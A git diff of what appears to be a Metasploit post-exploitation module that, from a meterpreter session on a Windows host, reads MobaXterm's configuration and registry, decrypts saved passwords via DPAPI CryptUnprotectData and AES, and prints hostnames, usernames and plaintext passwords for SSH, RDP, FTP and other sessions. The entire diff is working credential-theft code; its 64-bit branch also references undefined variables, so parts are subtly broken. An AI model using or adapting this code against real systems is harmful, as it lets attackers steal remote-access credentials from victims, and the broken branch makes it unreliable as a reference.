@@ -25,7 +25,7 @@ class MetasploitModule < Msf::Post
         ],
         'Author' => [
           'HyperSine', # Original author of the MobaXterm session decryption script and one who found the encryption keys.
-          'Kali-Team <kali-team[at]qq.com>' # Metasploit module
+          'Kali-Team <kali-team[at]qq.com>' # Metasploit module and Reverse master cipher decryption algorithm
         ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ]
@@ -33,10 +33,83 @@ class MetasploitModule < Msf::Post
     )
     register_options(
       [
-        OptString.new('PASSPHRASE', [ false, 'The configuration password that was set when MobaXterm was installed, if one was supplied']),
-        OptString.new('SESSION_PATH', [ false, 'Specifies the session directory path for MobaXterm']),
+        OptString.new('MASTER_PASSWORD', [ false, 'The configuration password that was set when MobaXterm was installed, if one was supplied']),
+        OptString.new('CONFIG_PATH', [ false, 'Specifies the config file path for MobaXterm']),
       ]
     )
+  end
+
+  def pack_add(data)
+    if is_86
+      addr = [data].pack('V')
+    else
+      addr = [data].pack('Q<')
+    end
+    return addr
+  end
+
+  def mem_write(data, length)
+    pid = session.sys.process.open.pid
+    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
+    mem = process.memory.allocate(length)
+    process.memory.write(mem, data)
+    return mem
+  end
+
+  def read_str(address, len, type)
+    begin
+      pid = session.sys.process.open.pid
+      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
+      raw = process.memory.read(address, len)
+      case type
+      when 0 # unicode
+        str_data = raw.gsub("\x00", '')
+      when 1 # null terminated
+        str_data = raw.unpack1('Z*')
+      when 2 # raw data
+        str_data = raw
+      end
+    rescue StandardError
+      str_data = nil
+    end
+    return str_data || 'Error Decrypting'
+  end
+
+  #
+  # RAILGUN HELPER FUNCTIONS
+  #
+  def is_86
+    pid = session.sys.process.open.pid
+    return session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
+  end
+
+  def windows_unprotect(entropy, data)
+    rg = session.railgun
+    pid = session.sys.process.getpid
+    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
+    mem = process.memory.allocate(data.length)
+    addr_entropy = session.railgun.util.alloc_and_write_string(entropy)
+    process.memory.write(mem, data)
+    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
+      addr = [mem].pack('V')
+      len = [data.length].pack('V')
+      elen = [entropy.length].pack('V')
+      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{[addr_entropy].pack('V')}", nil, nil, 0, 8)
+      len, addr = ret['pDataOut'].unpack('V2')
+    else
+      addr = Rex::Text.pack_int64le(mem)
+      len = Rex::Text.pack_int64le(data.length)
+      eaddr = Rex::Text.pack_int64le(mem2)
+      elen = Rex::Text.pack_int64le(ent.length)
+      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
+      p_data = ret['pDataOut'].unpack('VVVV')
+      len = p_data[0] + (p_data[1] << 32)
+      addr = p_data[2] + (p_data[3] << 32)
+    end
+
+    return '' if len == 0
+
+    process.memory.read(addr, len)
   end
 
   def key_crafter(config)
@@ -75,12 +148,17 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def mobaxterm_crypto_safe(ciphertext)
+  def mobaxterm_crypto_safe(ciphertext, config)
     return nil if ciphertext.nil? || ciphertext.empty?
 
     iv = ("\x00" * 16)
-    master_password = datastore['MASTER_PASSWORD'] || '1111111'
-    key = OpenSSL::Digest::SHA512.new(master_password).digest[0, 32]
+    master_password = datastore['MASTER_PASSWORD'] || ''
+    sesspass = config['Sesspass']["#{config['Sesspass']['LastUsername']}@#{config['Sesspass']['LastComputername']}"]
+    data_ini = Rex::Text.decode_base64('AQAAANCMnd8BFdERjHoAwE/Cl+s=') + Rex::Text.decode_base64(sesspass)
+    key = Rex::Text.decode_base64(windows_unprotect(config['SessionP'], data_ini))[0, 32]
+    if !master_password.empty?
+      key = OpenSSL::Digest::SHA512.new(master_password).digest[0, 32]
+    end
     aes = OpenSSL::Cipher.new('AES-256-ECB').encrypt
     aes.key = key
     new_iv = aes.update(iv)
@@ -94,33 +172,6 @@ class MetasploitModule < Msf::Post
     return padded_plain_bytes
   end
 
-  def mobaxterm_store_config(config)
-    if config[:hostname].to_s.empty? || config[:service_name].to_s.empty? || config[:port].to_s.empty? || config[:username].to_s.empty? || config[:password].nil?
-      return # If any of these fields are nil or are empty (with the exception of the password field which can be empty),
-      # then we shouldn't proceed, as we don't have enough info to store a credential which someone could actually
-      # use against a target.
-    end
-
-    service_data = {
-      address: config[:hostname],
-      port: config[:port],
-      service_name: config[:service_name],
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-
-    credential_data = {
-      origin_type: :session,
-      session_id: session_db_id,
-      post_reference_name: refname,
-      private_type: :password,
-      private_data: config[:password],
-      username: config[:username],
-      status: Metasploit::Model::Login::Status::UNTRIED
-    }.merge(service_data)
-    create_credential_and_login(credential_data)
-  end
-
   def gather_password(config)
     result = []
     if config['PasswordsInRegistry'] == '1'
@@ -132,7 +183,7 @@ class MetasploitModule < Msf::Post
         protocol, username = username.split(':') if username.include?(':')
         password = registry_getvaldata(parent_key, connect)
         key = key_crafter(config)
-        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password)
+        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)
         result << {
           protocol: protocol,
           server_host: server_host,
@@ -146,7 +197,7 @@ class MetasploitModule < Msf::Post
         protocol, username = username.split(':') if username.include?(':')
         password = config['Passwords'][connect]
         key = key_crafter(config)
-        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password)
+        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)
         result << {
           protocol: protocol,
           server_host: server_host,
@@ -167,7 +218,7 @@ class MetasploitModule < Msf::Post
       registry_enumvals(parent_key).each do |name|
         username, password = registry_getvaldata(parent_key, name).split(':')
         key = key_crafter(config)
-        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password)
+        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)
         result << {
           name: name,
           username: username,
@@ -178,7 +229,7 @@ class MetasploitModule < Msf::Post
       config['Credentials'].each_key do |name|
         username, password = config['Credentials'][name].split(':')
         key = key_crafter(config)
-        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password)
+        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)
         result << {
           name: name,
           username: username,
@@ -204,7 +255,7 @@ class MetasploitModule < Msf::Post
         valuable_info['Sesspass'] = config['Sesspass'] || nil
         valuable_info['Passwords'] = config['Passwords'] || {}
         valuable_info['Credentials'] = config['Credentials'] || {}
-        # valuable_info['Bookmarks'] = config['Bookmarks'] || nil
+        valuable_info['Bookmarks'] = config['Bookmarks'] || nil
         return valuable_info
       end
     else
@@ -213,26 +264,85 @@ class MetasploitModule < Msf::Post
     end
   end
 
+  def parser_bookmark(bookmarks)
+    result = []
+    protocol_hash = { '#109#0' => 'ssh', '#98#1' => 'telnet', '#128#5' => 'vnc', '#140#7' => 'sftp', '#130#6' => 'ftp', '#100#2' => 'rsh', '#91#4' => 'rdp' }
+    bookmarks.each_key do |key|
+      next if key.eql?('ImgNum') || key.eql?('SubRep') || bookmarks[key].empty?
+
+      bookmarks_split = bookmarks[key].strip.split('%')
+      if protocol_hash.include?(bookmarks_split[0])
+        protocol = protocol_hash[bookmarks_split[0]]
+        server_host = bookmarks_split[1]
+        port = bookmarks_split[2]
+        username = bookmarks_split[3]
+        result << { name: key, protocol: protocol, server_host: server_host, port: port, username: username }
+      else
+        print_warning("Parsing is not supported: #{bookmarks[key].strip}")
+      end
+    end
+    return result
+  end
+
   def run
     print_status("Gathering MobaXterm session information from #{sysinfo['Computer']}")
     session_p = 0
     grab_user_profiles.each do |user|
       next if user['AppData'].nil?
 
-      # require 'pry';binding.pry
       ini_config_path = "#{user['MyDocs']}\\MobaXterm\\MobaXterm.ini"
+      ini_config_path = datastore['CONFIG_PATH'] if datastore['CONFIG_PATH']
       config = parser_ini(ini_config_path)
       next if !config
 
-      # mobaxterm_crypto_safe("x2I5bw==")
       parent_key = "HKEY_USERS\\#{user['SID']}\\Software\\Mobatek\\MobaXterm"
       config['RegistryKey'] = parent_key
       session_p = registry_getvaldata(parent_key, 'SessionP') if registry_key_exist?(parent_key)
       pws_result = gather_password(config)
-      print_good(pws_result.to_s)
-      print_status('-' * 20)
+      columns = [
+        'Protocol',
+        'Hostname',
+        'Username',
+        'Password',
+      ]
+      pw_tbl = Rex::Text::Table.new(
+        'Header' => 'MobaXterm Password',
+        'Columns' => columns
+      )
+      pws_result.each do |item|
+        pw_tbl << item.values
+      end
       creds_result = gather_creads(config)
-      print_good(creds_result.to_s)
+      columns = [
+        'CredentialsName',
+        'Username',
+        'Password',
+      ]
+      creds_tbl = Rex::Text::Table.new(
+        'Header' => 'MobaXterm Credentials',
+        'Columns' => columns
+      )
+      creds_result.each do |item|
+        creds_tbl << item.values
+      end
+      bookmarks_result = parser_bookmark(config['Bookmarks'])
+      columns = [
+        'BookmarksName',
+        'Protocol',
+        'ServerHost',
+        'Port',
+        'Credentials or Passwords',
+      ]
+      bookmarks_tbl = Rex::Text::Table.new(
+        'Header' => 'MobaXterm Bookmarks',
+        'Columns' => columns
+      )
+      bookmarks_result.each do |item|
+        bookmarks_tbl << item.values
+      end
+      print_good(pw_tbl.to_s)
+      print_good(creds_tbl.to_s)
+      print_good(bookmarks_tbl.to_s)
     end
   end
 end
